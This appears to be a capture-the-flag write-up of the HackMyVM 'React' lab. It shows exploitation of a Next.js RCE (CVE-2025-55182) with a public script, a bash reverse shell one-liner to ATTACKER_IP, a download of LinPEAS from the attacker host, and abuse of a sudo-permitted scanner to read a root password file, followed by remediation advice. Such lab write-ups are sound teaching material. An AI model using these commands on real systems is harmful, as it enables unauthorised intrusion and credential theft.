---
layout: post
title: "HackMyVM - React"
date: 2026-01-14 02:15:00 +0700
categories: [HackMyVM, Easy]
tags: [nextjs, rce, cve-2025-55182, privilege-escalation, linux, web-security]
image:
  path: /assets/img/post/HackMyVm-React/banner.png
author: HanzXD
---

## Overview

React is an Easy-level CTF machine featuring a Remote Code Execution (RCE) vulnerability in Next.js version 15.0.0 and privilege escalation through misconfigured sudo permissions that allow arbitrary file read.

**Difficulty:** Easy  
**Target IP:** 192.168.1.8

---

## Reconnaissance

### Port Scanning

Starting with a RustScan to quickly identify running services:

```bash
rustscan -a 192.168.1.8
```

**Scan Results:**

```
Open 192.168.1.8:22
Open 192.168.1.8:80
Open 192.168.1.8:3000
```

### Service Enumeration

Performing a more detailed scan using Nmap for service version identification:

```bash
nmap -sC -sV -p 22,80,3000 192.168.1.8
```

**Detailed Results:**

```
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
3000/tcp open  ppp     syn-ack ttl 64
MAC Address: 08:00:27:84:58:96 (Oracle VirtualBox virtual NIC)
```

Identified ports:
- **Port 22** - SSH
- **Port 80** - HTTP
- **Port 3000** - HTTP (Next.js Application)

---

## Web Enumeration

### Analyzing Port 3000

After enumerating port 3000, I discovered a web application running the **Next.js** framework.

Identifying the Next.js version through response headers or source code analysis:

**Next.js Version:** `15.0.0`

---

## Vulnerability Discovery - CVE-2025-55182

### What is CVE-2025-55182?

CVE-2025-55182 is a critical Remote Code Execution (RCE) vulnerability affecting Next.js versions 15.0.0 through before 15.5.7. This vulnerability allows attackers to execute arbitrary code remotely without authentication.

**CVSS Score:** Critical  
**Affected Versions:** Next.js 15.0.0 - < 15.5.7  
**Impact:** Remote Code Execution without authentication

### Exploit Preparation

Using the exploit script from the following repository:

**Exploit Source:** [React2Shell - CVE-2025-55182 Exploit](https://github.com/xalgord/React2Shell/blob/master/react2shell.py)

```bash
git clone https://github.com/xalgord/React2Shell.git
cd React2Shell
```

---

## Initial Access - Exploiting Next.js RCE

### Executing the Exploit

Running the exploit script against the target:

```bash
python3 react2shell.py -u http://192.168.1.8:3000
```

**Output:**

```
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë              React2Shell - Next.js RCE Shell               ‚ïë
‚ïë  Target: http://192.168.1.8:3000                           ‚ïë
‚ïë  Root Mode: OFF                                            ‚ïë
‚ïë  Type: Standalone (No Dependencies)                        ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù

[*] Initializing shell...
ubuntu@target:/opt/target$
```

**Exploit successful!** We obtained an interactive shell on the target.

### Initial Reconnaissance

Verifying user identity and permissions:

```bash
ubuntu@target:/opt/target$ id
uid=1000(bot) gid=1000(bot) groups=1000(bot)
```

Shell successfully obtained as user **bot** with UID 1000.

Checking home directories:

```bash
ubuntu@target:/opt/target$ ls -la /home
total 12
drwxr-xr-x  3 root root 4096 Dec 13 22:16 .
drwxr-xr-x 18 root root 4096 Mar 18  2025 ..
drwxr-xr-x  5 bot  bot  4096 Jan 13 22:38 bot
```

### User Flag

Navigating to the bot user's home directory:

```bash
ubuntu@target:/opt/target$ cd /home/bot
ubuntu@target:/home/bot$ ls
user.txt

ubuntu@target:/home/bot$ cat user.txt
flag{user-4bb58d8876c0423d7f759a4d2dfa9cac}
```

**User Flag captured:** `flag{user-4bb58d8876c0423d7f759a4d2dfa9cac}` üéâ

### Upgrading to Stable Shell

To obtain a more stable and interactive shell, I upgraded using a reverse shell with **Penelope** listener.

**Setup Penelope Listener:**

```bash
penelope 9001
```

**Reverse Shell Payload:**

```bash
bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1
```

Shell upgrade successful! We now have a fully interactive TTY shell.

---

## Privilege Escalation

### Enumeration - Sudo Privileges

Checking sudo permissions for the bot user:

```bash
bot@React:~$ sudo -l
Matching Defaults entries for bot on React:
    env_reset, mail_badpass, 
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User bot may run the following commands on React:
    (ALL) NOPASSWD: /opt/react2shell/scanner.py
    (ALL) NOPASSWD: /usr/bin/rm -rf /
```

**Critical Finding:**
- User bot can run `/opt/react2shell/scanner.py` with root privileges without password
- There's also permission for `rm -rf /` (red flag for honeypot/trap!)

### Analyzing scanner.py

Checking the help menu to understand the script's functionality:

```bash
bot@React:~$ sudo /opt/react2shell/scanner.py --help
```

**Available Parameters:**

```
Usage: scanner.py [options]

Options:
  -h, --help            show this help message and exit
  -l LIST, --list LIST  File containing list of hosts (one per line)
  -t THREADS, --threads THREADS
                        Number of concurrent threads (default: 10)
  --timeout TIMEOUT     Request timeout in seconds (default: 10)
```

**Critical Parameter:** `-l LIST` - Reads a file and processes it as a list of hosts.

When run with sudo, this potentially allows **arbitrary file read** as root!

### File Discovery with LinPEAS

To find files potentially containing sensitive information, I ran **LinPEAS** for automated enumeration:

```bash
bot@React:~$ wget http://ATTACKER_IP/linpeas.sh
bot@React:~$ chmod +x linpeas.sh
bot@React:~$ ./linpeas.sh
```

**LinPEAS Results - Executable Files:**

```
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£ Executable files potentially added by user (limit 70)
2025-12-13+23:00:29.2705687710 /usr/bin/check_key
2025-12-13+22:51:20.6802629150 /opt/react2shell/scanner.py
2025-12-13+22:31:57.8558796180 /opt/react2shell/scanner_with_rce.py
```

**Interesting File:** `/usr/bin/check_key` - A non-standard binary potentially custom-made.

### Binary Analysis - check_key

Analyzing the binary using `strings`:

```bash
bot@React:~$ strings /usr/bin/check_key
/lib64/ld-linux-x86-64.so.2
fopen
fgets
strlen
fclose
system
__cxa_finalize
strcmp
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
/opt/key
cp /root/Reactrootpass.txt /opt
```

**Important Finding:**

The binary contains hardcoded paths to credential files:
- `/root/Reactrootpass.txt` - Most likely contains the root password!

This file is located in the `/root/` directory, which can only be read by the root user. However, we can leverage `scanner.py` with sudo to read it!

### Exploiting scanner.py for File Read

Leveraging the `-l` parameter in scanner.py to read protected files:

```bash
bot@React:~$ sudo /opt/react2shell/scanner.py -l /root/Reactrootpass.txt
```

**Output:**

```
brought to you by assetnote

[*] Loaded 1 host(s) to scan
[*] Using 10 thread(s)
[*] Timeout: 10s
[*] Using RCE PoC check
[!] SSL verification disabled

[ERROR] To75CuOTHLA7BMmH5Puv - Connection Error: HTTPSConnectionPool...

============================================================
SCAN SUMMARY
============================================================
  Total hosts scanned: 1
  Vulnerable: 0
  Not vulnerable: 1
  Errors: 0
============================================================
```

**Root credentials discovered:** `To75CuOTHLA7BMmH5Puv`

The string `To75CuOTHLA7BMmH5Puv` appears as a hostname that failed to resolve in the error message. This is the content of the `/root/Reactrootpass.txt` file successfully read through the arbitrary file read vulnerability!

### Escalating to Root

Using the discovered credentials to switch user to root:

```bash
bot@React:~$ su
Password: To75CuOTHLA7BMmH5Puv

root@React:/home/bot# id
uid=0(root) gid=0(root) groups=0(root)
```

**ROOT ACCESS ACHIEVED!** üéâ

### Root Flag

```bash
root@React:/home/bot# cd /root
root@React:~# ls
CVE-2025-55182  Reactrootpass.txt  root.txt

root@React:~# cat root.txt
flag{root-bc29a7159b63b18dc294002be32e1c22}
```

**Root Flag captured:** `flag{root-bc29a7159b63b18dc294002be32e1c22}` üöÄ

---

## Summary

### Flags Captured

- **User Flag:** `flag{user-4bb58d8876c0423d7f759a4d2dfa9cac}`
- **Root Flag:** `flag{root-bc29a7159b63b18dc294002be32e1c22}`

### Attack Chain

1. **Reconnaissance** - Port scanning identified Next.js application on port 3000
2. **Vulnerability Discovery** - Next.js version 15.0.0 vulnerable to CVE-2025-55182 (RCE)
3. **Initial Access** - Exploited CVE-2025-55182 to gain shell as user `bot`
4. **Enumeration** - Identified sudo privileges on `/opt/react2shell/scanner.py`
5. **Binary Analysis** - Analysis of `/usr/bin/check_key` revealed path to credential file
6. **Privilege Escalation** - Abused sudo privileges on scanner.py for arbitrary file read
7. **Root Access** - Switched user to root using extracted credentials

### Key Vulnerabilities

| Vulnerability | Impact | Severity |
|---------------|--------|----------|
| CVE-2025-55182 (Next.js RCE) | Remote Code Execution without authentication | Critical |
| Sudo Misconfiguration | Arbitrary File Read as root | High |
| Plaintext Credential Storage | Information Disclosure | Medium |

### Key Takeaways

- **Always keep frameworks updated** - CVE-2025-55182 is a real example of why patching is crucial
- **Sudo permissions must be strictly reviewed** - Scripts runnable with sudo should be carefully audited
- **Never store credentials in plaintext** - Passwords should be hashed or stored in secure vaults
- **LinPEAS is your friend** - Automated enumeration tools can reveal suspicious files and binaries
- **String analysis on binaries** - The `strings` command can reveal hardcoded paths and sensitive information

---

## Remediation Recommendations

### 1. Update Next.js Framework

```bash
npm update next@latest
# or
yarn upgrade next@latest
```

Upgrade to Next.js version **15.5.7** or higher to patch CVE-2025-55182.

### 2. Review Sudo Permissions

```bash
# Remove or restrict sudo access
sudo visudo
```

**Best Practices:**
- Only grant sudo privileges for commands that are absolutely necessary
- Avoid wildcard permissions
- Use command whitelisting with specific paths
- Implement logging for sudo usage

### 3. Secure Credential Storage

**Recommendations:**
- Never store passwords in plaintext files
- Use password managers or secure vaults (HashiCorp Vault, AWS Secrets Manager)
- Implement proper password hashing (bcrypt, Argon2)
- Use environment variables with proper encryption

### 4. Implement Least Privilege Principle

- Service accounts should have minimal required permissions
- Regular users don't need sudo access to system scripts
- Audit permissions regularly

### 5. Security Monitoring

- Implement file integrity monitoring (AIDE, Tripwire)
- Monitor sudo command executions
- Setup alerts for suspicious activities
- Regular security audits and vulnerability scanning

---

## References

- [CVE-2025-55182 Details](https://nvd.nist.gov/)
- [React2Shell Exploit](https://github.com/xalgord/React2Shell)
- [Next.js Security Advisories](https://github.com/vercel/next.js/security/advisories)
- [GTFOBins - Sudo Exploitation](https://gtfobins.github.io/)

---

Thanks for reading! Happy hacking! üöÄ